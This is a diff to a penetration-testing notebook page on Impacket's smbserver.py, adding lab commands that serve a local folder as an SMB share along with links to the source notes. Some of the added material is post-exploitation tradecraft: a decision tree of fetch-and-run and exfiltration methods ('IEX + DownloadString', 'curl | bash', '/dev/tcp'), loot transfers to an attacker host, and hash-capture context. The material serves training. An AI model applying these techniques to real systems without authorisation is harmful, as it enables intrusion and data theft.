@@ -9,6 +9,116 @@ hideFooterPagination: true
 
 {/* Generated from Commands/smbserver.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## smbserver.py: choose the operation and read the result
+
+Serve a local folder as an SMB share.
+
+### What the result establishes
+
+Verify the share name, served directory and incoming connection, then confirm the requested file on both ends.
+
+### Prerequisites and common failures
+
+Choose a directory intentionally; SMB client policy, authentication and port reachability can prevent transfers even when the server is listening.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+mkdir -p ~/transfer
+sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
+```
+
+### Example 2: SMB Downloads
+
+Run in: **Saved lab example**.
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: SMB Downloads
+
+Run in: **Saved lab example**.
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: SMB Downloads
+
+Run in: **Saved lab example**.
+
+```bash
+impacket-smbserver CompData /tmp/loot -smb2support -username grcan -password grcan123
+```
+
+Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: SMB Downloads
+
+Run in: **Saved lab example**.
+
+```zsh
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/rdp-share
+```
+
+Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: 11. Attacking SAM, SYSTEM & SECURITY
+
+Run in: **Saved lab example**.
+
+```bash
+# attacker:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — 11. Attacking SAM, SYSTEM & SECURITY](/password-attacks/password-attacks-cheat-sheet#11-attacking-sam-system-&-security). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Serve a local folder as an SMB share.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=smbserver) · [All tools](/index)
@@ -54,6 +164,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking SQL Databases: Module Notes — Capture MSSQL Service Hash](/modules/common-services/sql#capture-mssql-service-hash)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
@@ -73,6 +190,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Closing down connection (10.129.203.7,49728)
 [*] Remaining connections []
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Capture MSSQL Service Hash](/modules/common-services/full-reference#capture-mssql-service-hash)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -110,6 +234,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SMB Downloads">
@@ -122,11 +253,25 @@ UPLOADING FROM LINUX:
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **File Transfers for Linux and Windows**
 
@@ -134,11 +279,25 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password te
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/rdp-share
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 impacket-smbserver CompData /tmp/loot -smb2support -username grcan -password grcan123
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -152,6 +311,13 @@ impacket-smbserver CompData /tmp/loot -smb2support -username grcan -password grc
 # attacker:
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 11. Attacking SAM, SYSTEM & SECURITY](/password-attacks/password-attacks-cheat-sheet#11-attacking-sam-system-&-security)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -172,6 +338,13 @@ copy \\172.16.119.13\share\tool.exe C:\Users\Public\
 #   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
 copy \\tsclient\kali\tool.exe C:\Users\Public\
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -203,6 +376,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="11. File transfer over a pivot">
@@ -217,6 +397,13 @@ Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali �
 proxychains impacket-smbserver
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot) · [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Impacket: Script Quick Reference">
@@ -230,6 +417,13 @@ Context from the notebook: SMB client / local server smbclient.py ,  smbserver.p
 ```text
 smbserver.py
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -252,6 +446,21 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 [*] Config file parsed
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Creating a Share with smbserver.py](/active-directory/historical-vulnerability-labs#creating-a-share-with-smbserver-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
